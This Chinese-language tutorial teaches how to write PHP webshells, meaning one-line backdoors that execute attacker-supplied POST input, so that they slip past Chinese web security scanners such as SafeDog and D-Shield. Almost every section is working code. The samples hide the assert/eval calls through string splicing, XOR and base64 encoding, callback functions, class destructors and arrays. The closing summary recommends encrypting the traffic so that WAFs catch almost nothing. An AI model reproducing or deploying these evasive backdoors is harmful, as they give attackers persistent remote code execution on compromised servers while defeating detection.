<!-- TOC -->

- [1. 关于eval与assert](#1-关于eval与assert)
- [2. 字符串变形](#2-字符串变形)
    - [2.1. PHP中关于操作字符串的函数](#21-php中关于操作字符串的函数)
    - [2.2. 变形](#22-变形)
- [3. 定义函数绕过](#3-定义函数绕过)
- [4. 回调函数](#4-回调函数)
    - [回调函数列表](#回调函数列表)
    - [冷门回调函数](#冷门回调函数)
- [5. 回调函数变形](#5-回调函数变形)
- [6. 特殊字符干扰](#6-特殊字符干扰)
- [7. 数组](#7-数组)
- [8. 类](#8-类)
- [9. 编码绕过](#9-编码绕过)
- [10. 无字符特征马](#10-无字符特征马)
    - [10.1. 利用异或, 编码等方式 例如 p 神博客的](#101-利用异或-编码等方式-例如-p-神博客的)
    - [10.2. 利用正则匹配字符 如 Tab 等 然后转换为字符](#102-利用正则匹配字符-如-tab-等-然后转换为字符)
    - [10.3. 利用 POST 包获取关键参数执行 例如](#103-利用-post-包获取关键参数执行-例如)
- [11. PHP7.1 后 webshell 何去何从](#11-php71-后-webshell-何去何从)
- [12. 总结](#12-总结)

<!-- /TOC -->
# 1. 关于eval与assert
eval是一个语言构造器而不是一个函数，不能被可变函数调用，例如`<?php $a=eval;$a()?>`就无法正常运行，所以用eval的话不如assert灵活。assert回调函数则允许你简易地捕获传入断言的代码，并包含断言的位置信息。
# 2. 字符串变形
字符串变形多数用于遛狗，相当对于D盾，安全狗更加重视形，一个特殊的变形就能绕过安全狗。
## 2.1. PHP中关于操作字符串的函数
```php
ucwords() //函数把字符串中每个单词的首字符转换为大写。
ucfirst() //函数把字符串中的首字符转换为大写。
trim() //函数从字符串的两端删除空白字符和其他预定义字符。
substr_replace() //函数把字符串的一部分替换为另一个字符串
substr() //函数返回字符串的一部分。
strtr() //函数转换字符串中特定的字符。
strtoupper() //函数把字符串转换为大写。
strtolower() //函数把字符串转换为小写。
strtok() //函数把字符串分割为更小的字符串
str_rot13() //函数对字符串执行 ROT13 编码。
//PHP的灵活性操作字符串的函数还有很多
```
## 2.2. 变形
用 substr_replace() 函数变形assert达到免杀的效果
```php
<?php
$a = substr_replace("assexx","rt",4);
$a($_POST['x']);
?>
```
# 3. 定义函数绕过
定义一个函数把关键词分割达到bypass效果
```php
<?php 
function kdog($a){
    $a($_POST['x']);
}
kdog(assert);
?>
//另一端
<?php 
function kdog($a){
    assert($a);
}
kdog($_POST[x]);
?>
```
# 4. 回调函数
## 回调函数列表
```php
call_user_func_array()
call_user_func()
array_filter() 
array_walk()  
array_map()
registregister_shutdown_function()
register_tick_function()
filter_var() 
filter_var_array() 
uasort() 
uksort() 
array_reduce()
array_walk() 
array_walk_recursive()
```
## 冷门回调函数
```php
<?php 
forward_static_call_array(assert,array($_POST[x]));
?>
```
# 5. 回调函数变形
定义函数或者类来调用回调函数
```php
//定义一个函数
<?php
function test($a,$b){
    array_map($a,$b);
}
test(assert,array($_POST['x']));
?>
//定义一个类
<?php
class loveme {
    var $a;
    var $b;
    function __construct($a,$b) {
        $this->a=$a;
        $this->b=$b;
    }
    function test() {
       array_map($this->a,$this->b);
    }
}
$p1=new loveme(assert,array($_POST['x']));
$p1->test();
?>
```
# 6. 特殊字符干扰
```php
//初代版本
<?php
$a = $_REQUEST['a'];
$b = null;
eval($b.$a);
?>
//不过已经不能免杀了，利用适当的变形即可免杀，如
<?php
$a = $_POST['a'];
$b = "\n";
eval($b.=$a);
?>
//其他方法大家尽情发挥如”\r\n\t”, 函数返回，类，等等
//除了连接符号 还有个命名空间的东西 \ 具体大家可以看看 php 手册
<?php
function dog($a){
    \assert($a);
}
dog($_POST[x]);
?>
```
# 7. 数组
把执行代码放入数组中执行绕过
```php
<?php
$a = substr_replace("assexx","rt",4);
$b=[''=>$a($_POST['q'])];
?>
//多维数组

<?php
$b = substr_replace("assexx","rt",4);
$a = array($arrayName = array('a' => $b($_POST['q'])));
?>
```
# 8. 类
说到类肯定要搭配上魔术方法比如 __destruct()，__construct()
```php
<?php 
class me
{
  public $a = '';
  function __destruct(){
    assert("$this->a");
  }
}
$b = new me;
$b->a = $_POST['x'];
?>
//用类把函数包裹,D 盾对类查杀较弱
```
# 9. 编码绕过
用 php 的编码函数，或者用异或、简单的 base64_decode, 其中因为他的正则匹配可以加入一些下划线干扰杀软
```php
<?php
$a = base64_decode("YXNz+ZX____J____0");
$a($_POST[x]);
?>
//异或
<?php
$a= ("!"^"@").'ssert';
$a($_POST[x]);
?>
```
# 10. 无字符特征马
对于无特征马这里我的意思是无字符特征

## 10.1. 利用异或, 编码等方式 例如 p 神博客的
```php
<?php
$_=('%01'^'`').('%13'^'`').('%13'^'`').('%05'^'`').('%12'^'`').('%14'^'`'); // $_='assert';
$__='_'.('%0D'^']').('%2F'^'`').('%0E'^']').('%09'^']'); // $__='_POST';
$___=$$__;
$_($___[_]); // assert($_POST[_]);
```
## 10.2. 利用正则匹配字符 如 Tab 等 然后转换为字符
## 10.3. 利用 POST 包获取关键参数执行 例如
```php
<?php
$decrpt = $_POST['x'];
$arrs = explode("|", $decrpt)[1];
$arrs = explode("|", base64_decode($arrs));
call_user_func($arrs[0],$arrs[1]);
?>
```
# 11. PHP7.1 后 webshell 何去何从
在 php7.1 后面我们已经不能使用强大的 assert 函数了用 eval 将更加注重特殊的调用方法和一些字符干扰, 后期大家可能更加倾向使用大马
# 12. 总结
* 对于安全狗杀形，d 盾杀参的思路来绕过。生僻的回调函数, 特殊的加密方式, 以及关键词的后传入都是不错的选择。
* 对于关键词的后传入对免杀安全狗，d 盾，河马 等等都是不错的，后期对于菜刀的轮子，也要走向高度的自定义化
* 用户可以对传出的 post 数据进行自定义脚本加密，再由 webshell 进行解密获取参数，那么以现在的软 WAF 查杀能力几乎为 0，安全软件也需要与时俱进了。
